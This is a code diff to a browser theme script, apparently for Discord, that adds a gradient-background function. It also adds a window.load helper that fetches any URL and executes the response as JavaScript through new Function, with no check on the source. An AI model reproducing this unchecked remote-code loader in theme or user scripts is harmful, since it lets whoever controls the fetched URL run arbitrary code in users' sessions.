@@ -14,6 +14,33 @@ window.names = []; // List of names
 window.icon = []; // List of icon
 window.funcname = []; // List of function names
 
+window.Gradiant = function(bottom, top) {
+    func = "Gradiant(\"load\", \"load\")"
+    if (top === undefined) {
+        console.log("fail")
+    }else {
+    if (bottom === "load") {
+        bottom = window.GB
+        top = window.GT
+    }
+    window.GT = top
+    window.GB = bottom
+    document.querySelector("html").className = "custom-theme-background full-motion theme-dark platform-web font-size-16";
+    const style = document.createElement("style");
+    style.setAttribute("data-client-themes", "true");
+    style.setAttribute("data-rh", "true");
+    style.textContent = `
+      .custom-theme-background {
+          --custom-theme-background: linear-gradient(64.92deg, ${bottom} 0%, ${top} 100%);
+      }
+    `;
+    document.head.appendChild(style);
+}}
+
+window.load = function(url) {
+    (async()=>{new Function(await (await fetch(url)).text())();})();
+}
+
 // Function to create the dark mode GUI
 function select() {
     // Check if GUI already exists
@@ -78,7 +105,7 @@ function select() {
             console.log(`Theme "${name}" was selected!`);
 
             // Get the function name based on the index
-            const func = window.funcname[index];  // Get the function name directly
+            func = window.funcname[index];  // Get the function name directly
             if (typeof window[func] === "function") {
                 window[func]();  // Call the function dynamically
             } else {
@@ -103,8 +130,6 @@ function load() {
 }
 
 setInterval(load, 500);
-
-// Nitro Themes
 
 // Crimson Moon
 (function() {
